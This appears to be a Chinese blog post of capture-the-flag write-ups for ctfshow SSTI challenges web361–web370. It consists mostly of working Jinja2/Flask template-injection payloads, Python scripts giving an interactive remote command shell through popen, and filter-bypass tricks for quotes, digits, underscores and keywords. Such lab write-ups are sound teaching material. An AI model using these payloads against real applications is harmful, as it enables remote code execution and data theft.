@@ -1,0 +1,592 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta name="referrer" content="no-referrer"/>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="golden的部落阁" href="http://blog.g01den.top/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="golden的部落阁" href="http://blog.g01den.top/atom.xml" />
+<link rel="alternate" type="application/json" title="golden的部落阁" href="http://blog.g01den.top/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="Web" />
+
+
+<link rel="canonical" href="http://blog.g01den.top/posts/4826d2ce.html">
+
+
+
+  <title>
+ctfshow-SSTI - Web狗的自我安慰 |
+golden的部落阁 = golden的部落阁 = subtitle写得真好</title>
+<meta name="generator" content="Hexo 7.2.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">ctfshow-SSTI
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2025-05-03 23:19:26">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2025-05-03T23:19:26+08:00">2025-05-03</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">golden的部落阁</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+          <img src="https://s2.loli.net/2025/05/03/WC6qReAr3aKo287.jpg">
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/Web/" itemprop="item" rel="index" title="分类于 Web狗的自我安慰"><span itemprop="name">Web狗的自我安慰</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="http://blog.g01den.top/posts/4826d2ce.html">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="g01den">
+    <meta itemprop="description" content="subtitle写得真好, golden的部落阁">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="golden的部落阁">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h1 id="web361"><a class="markdownIt-Anchor" href="#web361">#</a> web361：</h1>
+<p>​		name 传参，直接干：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> get</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_wrap</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>,<span class="number">200</span>):</span><br><span class="line">        url = <span class="string">&quot;http://a96b5242-08d2-4901-8692-4b324f00d95a.challenge.ctf.show/?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;]&#125;&#125;&quot;</span></span><br><span class="line">        resp = get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;os._wrap_close&quot;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(url)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        cmd = <span class="built_in">input</span>(<span class="string">&#x27;Enter your command: &#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            url = <span class="string">&quot;http://a96b5242-08d2-4901-8692-4b324f00d95a.challenge.ctf.show/?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;&quot;</span> + cmd + <span class="string">&quot;&#x27;).read()&#125;&#125;&quot;</span></span><br><span class="line">            anser = get(url).text</span><br><span class="line">            <span class="built_in">print</span>(anser)</span><br><span class="line">poc()</span><br></pre></td></tr></table></figure>
+<p>​	<strong>补充：几种手法</strong></p>
+<blockquote>
+<ul>
+<li>手法一：payload os.warp_close 类 的 popen 方法</li>
+<li>?name= <code>&#123;&#123;"".__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']("cat /flag").read()&#125;&#125;</code></li>
+<li>手法二： 利用 config：</li>
+<li>?name= <code>&#123;&#123;config.__class__.__init__.__globals__['os'].popen('cat ../flag').read() &#125;&#125;</code></li>
+<li>手法三： <code>lipsum.__globals__</code> 含有 os 模块：</li>
+<li>?name= <code>&#123;&#123;lipsum.__globals__['os'].popen('tac ../flag').read()&#125;&#125;</code></li>
+<li>手法三：利用 <code>__builtins__</code></li>
+<li>?name= <code>&#123;&#123;url_for.__globals__['__builtins__']['eval'](__import__('os').popen('cat /flag').read()&#125;&#125;</code></li>
+<li>?name= <code>&#123;&#123;url_for.__globals__.__builtins__.eval("__import__('os').popen('cat /flag').read()")&#125;&#125;</code></li>
+</ul>
+</blockquote>
+<h1 id="web362"><a class="markdownIt-Anchor" href="#web362">#</a> web362：</h1>
+<p>​		过滤了数字 2，3，上没有数字的 payload 就行了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> get</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        cmd = <span class="built_in">input</span>(<span class="string">&#x27;Enter your command: &#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            url = <span class="string">&quot;http://059cc139-d7d5-4369-86b1-0f3cf98b114c.challenge.ctf.show/?name=&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;&quot;</span> + cmd + <span class="string">&quot;&#x27;).read() &#125;&#125;&quot;</span></span><br><span class="line">            anser = get(url).text</span><br><span class="line">            <span class="built_in">print</span>(anser)</span><br><span class="line">poc()</span><br></pre></td></tr></table></figure>
+<p>​		另外的 payload：</p>
+<ul>
+<li>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>?name<span class="token operator">=</span><span class="token operator">&lt;</span>!<span class="token operator">-</span><span class="token operator">-</span>swig￼<span class="token number">26</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span><span class="token operator">&lt;</span>!<span class="token operator">-</span><span class="token operator">-</span>swig￼<span class="token number">27</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#先利用 join 和 count 过滤器得到数字 2，然后再用 66*2 去得到 132</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">&lt;</span>!<span class="token operator">-</span><span class="token operator">-</span>code￼<span class="token number">2</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span></pre></td></tr></table></figure></li>
+<li>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>?name<span class="token operator">=</span><span class="token operator">&lt;</span>!<span class="token operator">-</span><span class="token operator">-</span>swig￼<span class="token number">28</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span></pre></td></tr><tr><td data-num="2"></td><td><pre>或者</pre></td></tr><tr><td data-num="3"></td><td><pre>?name<span class="token operator">=</span><span class="token operator">&lt;</span>!<span class="token operator">-</span><span class="token operator">-</span>swig￼<span class="token number">29</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">&lt;</span>!<span class="token operator">-</span><span class="token operator">-</span>code￼<span class="token number">3</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span></pre></td></tr></table></figure></li>
+</ul>
+<p>​		payload2：这里用 config 拿到字符串，比较麻烦就不全演示了，只演示部分：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;url_for.__globals__[(config.__str__()[<span class="number">2</span>])%2B(config.__str__()[<span class="number">42</span>])]&#125;&#125;</span><br><span class="line">相当于</span><br><span class="line">?name=&#123;&#123;url_for.__globals__[<span class="string">&#x27;os&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>​		payload3：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=url_for.__globals__.__builtins__.<span class="built_in">chr</span> %&#125;&#123;% <span class="built_in">print</span>  url_for.__globals__[<span class="built_in">chr</span>(<span class="number">111</span>)%2bchr(<span class="number">115</span>)]%&#125;</span><br><span class="line"> </span><br><span class="line">使用</span><br><span class="line">?name=&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=url_for.__globals__.__builtins__.<span class="built_in">chr</span> %&#125;&#123;&#123; url_for.__globals__[<span class="built_in">chr</span>(<span class="number">111</span>)%2bchr(<span class="number">115</span>)]&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="web364"><a class="markdownIt-Anchor" href="#web364">#</a> web364：</h1>
+<p>​		过滤了引号，args，同时不允许使用 POST 传参，使用 Cookie 传参吧：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">94</span>][request.cookies.m1](<span class="number">0</span>,request.cookies.m2)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>​		之后 Cookie 传入参数：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m1=get_data;m2=/flag</span><br></pre></td></tr></table></figure>
+<h1 id="web365"><a class="markdownIt-Anchor" href="#web365">#</a> Web365：</h1>
+<p>​		这里在上一个题的基础上过滤了中括号，所以得用别的方法：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(<span class="number">290</span>).__init__.__globals__.__getitem__(request.cookies.m1).popen(request.cookies.m2).read()</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>​		之后 Cookie 传入：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m1=os;m2=cat /flag</span><br></pre></td></tr></table></figure>
+<p>​		还有个办法，不过是一次性的，失败了之后环境就废了，毕竟 pop 会删除对应的键，导致环境崩溃：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__base__.__subclasses__().pop(<span class="number">290</span>).__init__.__globals__.pop(request.cookies.m1).popen(request.cookies.m2).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>​				之后 Cookie 传入：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m1=os;m2=cat /flag</span><br></pre></td></tr></table></figure>
+<h1 id="web366"><a class="markdownIt-Anchor" href="#web366">#</a> Web366：</h1>
+<p>​		这个题多过滤了下划线，可以用 lipsum 绕过：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum|attr(request.cookies.m1)).os.popen(request.cookies.m2).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>​		之后 Cookie 传入：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m1=__globals__;m2=cat /flag</span><br></pre></td></tr></table></figure>
+<h1 id="web367"><a class="markdownIt-Anchor" href="#web367">#</a> Web367：</h1>
+<p>​		这个题又过滤了个 os，直接扔个 payload 吧，Payload 解释问 Ai 都可以问出来：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum|attr(request.cookies.m1)).get(request.cookies.m3).popen(request.cookies.m2).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>​		之后传入 Cookie：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m1=__globals__;m2=cat /flag;m3=os</span><br></pre></td></tr></table></figure>
+<h1 id="web368"><a class="markdownIt-Anchor" href="#web368">#</a> Web368：</h1>
+<p>​		这个题，需要用到 <code>&#123;% %&#125;</code> ，因为双大括号里的 request 被过滤了，但是 <code>&#123;% %&#125;</code>  中的 request 没有被过滤，和上一个题构造的 payload 一样，不过有点改变，就是没有使用双大括号，所以需要 print 输出以下（类似无回显）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;%<span class="built_in">print</span>((lipsum|attr(request.cookies.m1)).get(request.cookies.m3).popen(request.cookies.m2).read())%&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="web369"><a class="markdownIt-Anchor" href="#web369">#</a> Web369：</h1>
+<p>​		这里直接给 request 给 ban 了，不过可以自己拼字符串，还算好，直接上最终 payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?name=</span><br><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=a)|join%&#125;&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">24</span>)%&#125;&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(init=a)|join,a,a)|join%&#125;&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(<span class="built_in">globals</span>=a)|join,a,a)|join()%&#125;&#123;% <span class="built_in">set</span> geti=(a,a,<span class="built_in">dict</span>(getitem=a)|join,a,a)|join()%&#125;&#123;% <span class="built_in">set</span> buil=(a,a,<span class="built_in">dict</span>(builtins=a)|join,a,a)|join()%&#125;&#123;% <span class="built_in">set</span> x=(x|attr(ini)|attr(glo)|attr(geti))(buil)%&#125;&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=x.<span class="built_in">chr</span>%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> file=<span class="built_in">chr</span>(<span class="number">47</span>)%2bchr(<span class="number">102</span>)%2bchr(<span class="number">108</span>)%2bchr(<span class="number">97</span>)%2bchr(<span class="number">103</span>)%&#125;&#123;%<span class="built_in">print</span>(x.<span class="built_in">open</span>(file).read())%&#125;</span><br></pre></td></tr></table></figure>
+<p>​		看着很长很唬人，但实际确实不简单，这个我会在下一篇文章进行考点总结的，不急，这里先给下解释：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?name=</span><br><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=a)|join%&#125;          //拼接出pop</span><br><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">24</span>)%&#125;         //拼接出_</span><br><span class="line">&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(init=a)|join,a,a)|join%&#125;          //拼接出__init__</span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(<span class="built_in">globals</span>=a)|join,a,a)|join()%&#125;       //拼接出__globals__</span><br><span class="line">&#123;% <span class="built_in">set</span> geti=(a,a,<span class="built_in">dict</span>(getitem=a)|join,a,a)|join()%&#125;		//拼接出__getitem__</span><br><span class="line">&#123;% <span class="built_in">set</span> buil=(a,a,<span class="built_in">dict</span>(builtins=a)|join,a,a)|join()%&#125;		//拼接出__builtins__</span><br><span class="line">&#123;% <span class="built_in">set</span> x=(x|attr(ini)|attr(glo)|attr(geti))(buil)%&#125;		</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=x.<span class="built_in">chr</span>%&#125;		//使用<span class="built_in">chr</span>类来进行RCE因为等会要<span class="built_in">ascii</span>转字符</span><br><span class="line">&#123;% <span class="built_in">set</span> file=<span class="built_in">chr</span>(<span class="number">47</span>)%2bchr(<span class="number">102</span>)%2bchr(<span class="number">108</span>)%2bchr(<span class="number">97</span>)%2bchr(<span class="number">103</span>)%&#125;	//拼接出/flag</span><br><span class="line">&#123;%<span class="built_in">print</span>(x.<span class="built_in">open</span>(file).read())%&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="web370"><a class="markdownIt-Anchor" href="#web370">#</a> Web370：</h1>
+<p>​		这个题过滤了数字，不过可以用全角数字来绕过，转换的代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">half2full</span>(<span class="params">half</span>):</span><br><span class="line">    full = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> half:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(ch) <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">            ch = <span class="built_in">chr</span>(<span class="built_in">ord</span>(ch) + <span class="number">0xfee0</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">ord</span>(ch) == <span class="number">32</span>:</span><br><span class="line">            ch = <span class="built_in">chr</span>(<span class="number">0x3000</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        full += ch</span><br><span class="line">    <span class="keyword">return</span> full</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    t = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    s = <span class="built_in">input</span>(<span class="string">&quot;输入想要转换的数字字符串：&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        t += half2full(i)</span><br><span class="line">    <span class="built_in">print</span>(t)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>​		得到的 payload 如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?name=</span><br><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(２４)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(init=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(<span class="built_in">globals</span>=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> geti=(a,a,<span class="built_in">dict</span>(getitem=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> built=(a,a,<span class="built_in">dict</span>(builtins=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=x.<span class="built_in">chr</span>%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> file=<span class="built_in">chr</span>(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(x.<span class="built_in">open</span>(file).read())%&#125;</span><br></pre></td></tr></table></figure>
+      <div class="tags">
+          <a href="/tags/Web/" rel="tag"><i class="ic i-tag"></i> Web</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2025-05-03 23:39:38" itemprop="dateModified" datetime="2025-05-03T23:39:38+08:00">2025-05-03</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> 赞赏</button>
+  <p>请我喝[茶]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="g01den 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="g01den 支付宝">
+        <p>支付宝</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="g01den 贝宝">
+        <p>贝宝</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>g01den <i class="ic i-at"><em>@</em></i>golden的部落阁
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="http://blog.g01den.top/posts/4826d2ce.html" title="ctfshow-SSTI">http://blog.g01den.top/posts/4826d2ce.html</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/posts/cf99ed43.html" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2025&#x2F;03&#x2F;26&#x2F;xrS4V3bGRAsozXj.jpg" title="从NSSCTF开始的复建之路">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> 发电日常</span>
+  <h3>从NSSCTF开始的复建之路</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/posts/2d792864.html" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2025&#x2F;09&#x2F;13&#x2F;hLAZVGrtXDvxJIN.png" title="Python栈帧逃逸">
+  <span class="type">下一篇</span>
+  <span class="category"><i class="ic i-flag"></i> Web狗的自我安慰</span>
+  <h3>Python栈帧逃逸</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web361"><span class="toc-number">1.</span> <span class="toc-text"> web361：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web362"><span class="toc-number">2.</span> <span class="toc-text"> web362：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web364"><span class="toc-number">3.</span> <span class="toc-text"> web364：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web365"><span class="toc-number">4.</span> <span class="toc-text"> Web365：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web366"><span class="toc-number">5.</span> <span class="toc-text"> Web366：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web367"><span class="toc-number">6.</span> <span class="toc-text"> Web367：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web368"><span class="toc-number">7.</span> <span class="toc-text"> Web368：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web369"><span class="toc-number">8.</span> <span class="toc-text"> Web369：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web370"><span class="toc-number">9.</span> <span class="toc-text"> Web370：</span></a></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+        <ul>
